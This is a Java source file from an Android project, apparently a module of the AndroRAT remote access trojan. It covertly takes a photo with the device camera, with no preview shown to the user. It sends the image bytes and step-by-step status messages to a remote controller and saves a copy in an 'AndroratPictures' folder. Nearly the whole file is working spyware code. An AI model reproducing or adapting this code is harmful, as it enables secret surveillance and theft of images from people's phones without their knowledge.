package my.app.Library;

import java.io.IOException;

import my.app.client.ClientListener;
import Packet.FilePacket;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.CameraInfo;
import android.sax.StartElementListener;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;

public class PhotoTaker {

	Camera cam;
	ClientListener ctx;
	int chan ;
	SurfaceHolder holder;
	private int cameraId = 0;
	
	private PictureCallback pic = new PictureCallback() {

	    public void onPictureTaken(byte[] data, Camera camera) {
	    	try{	
	    		Log.i("PhotoTaker", "Before picture sent !");
	    		ctx.sendInformation("before picture send");
		    	ctx.handleData(chan, data);
		        Log.i("PhotoTaker", "After picture sent !");
		        ctx.sendInformation("after picture send");
		        cam.release();
		        cam = null;
	    	}catch (Exception e){
	    		Log.e("PhotoTaker", "ERROR Sending picture !: " + e.getMessage());
	    		ctx.sendError("ERROR Sending picture !: " + e.getMessage());
	    	}
	    	
	    	
	        File pictureFileDir = getDir();

	        if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {

	          Log.e("PhotoTaker", "Can't create directory to save image.");
	          ctx.sendError("Can't create directory to save image");
	          return;

	        }

	        String photoFile = "Picture_" + "kk" + ".jpg";

	        String filename = pictureFileDir.getPath() + File.separator + photoFile;
	        Log.i("PhotoTaker", "Filepath" + filename);
	        ctx.sendInformation("Saved image in  " + filename);
	    	
	    	File pictureFile = new File(filename);

	        try {
	          FileOutputStream fos = new FileOutputStream(pictureFile);
	          fos.write(data);
	          fos.close();
	          Log.i("PhotoTaker", "File Saved");
	          ctx.sendInformation("File saved");
	        }catch (Exception e){
	          Log.e("PhotoTaker", "ERROR Saving photo file");
	          ctx.sendError("ERROR Saving photo file");
	        }
	    }
	};
	
	private File getDir() {
		    File sdDir = Environment
		      .getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
		    return new File(sdDir, "AndroratPictures");
		  }
	
	public PhotoTaker(ClientListener c, int chan) {
		this.chan = chan ;
		ctx = c;
	}
	/*
	public boolean takePhoto() {
		Intent photoActivity = new Intent(this, PhotoActivity.class);
		photoActivity.setAction(PhotoTaker.class.getName());
		ctx.star
	}
	*/
	private int findFrontFacingCamera() {
	    int cameraId = -1;
	    // Search for the front facing camera
	    int numberOfCameras = Camera.getNumberOfCameras();
	    ctx.sendInformation("Number of cameras : " + numberOfCameras);
	    Log.i("PhotoTaker", "Number of cameras : " + numberOfCameras);
	    for (int i = 0; i < numberOfCameras; i++) {
	      Log.i("PhotoTaker", "Camera found id: " + i);
	      ctx.sendInformation("Camera found id: " + i);
	      CameraInfo info = new CameraInfo();
	      Camera.getCameraInfo(i, info);
	      if (info.facing == CameraInfo.CAMERA_FACING_BACK) {
	        Log.i("PhotoTaker", " Facing Camera found " + info.facing );
	        ctx.sendInformation("Facing Camera found : " + i);
	        cameraId = i;
	        break;
	      }
	    }
	    return cameraId;
	  }
	
	public boolean takePhoto() {
        if(!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA))){
        	Log.e("PhotoTaker", "No camera!");
        	ctx.sendError("ERROR no camera");
        	return false;
        }
        Log.i("PhotoTaker", "Just before Open !");
        try {
        	cameraId = findFrontFacingCamera();
        	if (cameraId == -1) {cameraId = 0;}
        	Log.i("PhotoTaker", "Using camera:" + cameraId);
        	ctx.sendInformation("Using camera: " + cameraId);
        	cam = Camera.open(cameraId);
        } catch (Exception e) { 
        	Log.e("PhotoTaker", "Opening camera!");
        	ctx.sendError("ERROR Opening camera: " + e);
        	return false; 
        }
        
        Log.i("PhotoTaker", "Right after Open !");
        ctx.sendInformation("after open");
        
        if (cam == null){
        	Log.e("PhotoTaker", "Cam is null");
        	ctx.sendError("ERROR no cam");
        	return false;
        }

        
        SurfaceView view = new SurfaceView(ctx);
        Log.i("PhotoTaker", "Right after SurfaceView");
        ctx.sendInformation("after surfceview");
        try {
        	//holder = view.getHolder();
        	//cam.setPreviewDisplay(holder);
        	cam.setPreviewDisplay(null);
        	cam.setPreviewCallback(null);
        	Log.i("PhotoTaker", "Right after PreviewDisplay");
        	ctx.sendInformation("After previewDisplay");
        } catch(Exception e) { 
        	Log.e("PhotoTaker", "Setting display");
        	ctx.sendError("ERROR setting display: " + e);
        	
        	return false; 
        	}
        
        //cam.startPreview();
        Log.i("PhotoTaker", "Right after startPreview");
        ctx.sendInformation("after startPreview");
        try{
	        cam.takePicture(null, null, pic);
	        Log.i("PhotoTaker", "Right after takePicture");
	        ctx.sendInformation("after take picture");
	     
        }catch (Exception e){
        	
        	Log.e("PhotoTaker", "ERROR in takePicture callback: " + e);
        	ctx.sendError("ERROR in takePicture callback: " + e);
        	cam.release();
        }
        return true;
	}
	

}
